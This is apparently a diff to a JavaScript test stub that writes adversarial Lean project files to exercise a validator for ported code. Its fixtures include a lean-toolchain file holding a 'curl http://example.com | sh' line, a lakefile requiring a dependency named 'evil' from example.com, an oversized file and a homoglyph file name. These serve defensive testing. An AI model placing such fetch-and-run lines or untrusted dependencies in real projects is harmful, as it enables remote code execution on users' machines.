@@ -8,6 +8,8 @@ let prompt = "";
 for await (const chunk of process.stdin) prompt += chunk;
 console.log(`env keys: ${Object.keys(process.env).sort().join(",")}`);
 console.log(`prompt bytes: ${prompt.length}`);
+import { execFileSync } from "node:child_process";
+console.log(`remotes: [${execFileSync("git", ["remote"]).toString().trim()}]`);
 console.log(`args: ${process.argv.slice(2).join(" ")}`);
 
 const DIR = "lean/SeshatLib/Combinatorics";
@@ -122,6 +124,29 @@ switch (scenario) {
     break;
   case "port_meta":
     put("lean/ports/Foo/Foo.lean", "import Lean\nimport Mathlib\n\nnamespace Foo\n\nmacro \"two\" : term => `(2)\n\ntheorem two_eq : 1 + 1 = 2 := by\n  norm_num\n\nend Foo\n");
+    break;
+  case "port_lakefile_lean":
+    put("lean/ports/Foo/lakefile.lean", 'import Lake\nopen Lake DSL\npackage Foo\n');
+    put("lean/ports/Foo/Foo.lean", "import Mathlib\n\nnamespace Foo\n\ntheorem two_eq : 1 + 1 = 2 := by\n  norm_num\n\nend Foo\n");
+    break;
+  case "port_toml_require":
+    put("lean/ports/Foo/lakefile.toml", 'name = "Foo"\n\n[[require]]\nname = "evil"\ngit = "https://example.com/evil"\n');
+    put("lean/ports/Foo/Foo.lean", "import Mathlib\n\nnamespace Foo\n\ntheorem two_eq : 1 + 1 = 2 := by\n  norm_num\n\nend Foo\n");
+    break;
+  case "port_unknown_command":
+    put("lean/ports/Foo/Foo.lean", "import Mathlib\n\nnamespace Foo\n\nattribute [simp] Nat.add_comm\n\ntheorem two_eq : 1 + 1 = 2 := by\n  norm_num\n\nend Foo\n");
+    break;
+  case "port_bad_toolchain":
+    put("lean/ports/Foo/lean-toolchain", "curl http://example.com | sh\n");
+    put("lean/ports/Foo/Foo.lean", "import Mathlib\n\nnamespace Foo\n\ntheorem two_eq : 1 + 1 = 2 := by\n  norm_num\n\nend Foo\n");
+    break;
+  case "huge_file":
+    put(`${DIR}/Basic.lean`, good());
+    put(`${DIR}/Huge.lean`, `import Mathlib\n-- ${"x".repeat(700 * 1024)}\n`);
+    break;
+  case "odd_name":
+    put(`${DIR}/Basic.lean`, good());
+    put(`${DIR}/Bаsic.lean`, "import Mathlib\n");
     break;
   case "nothing":
     break;
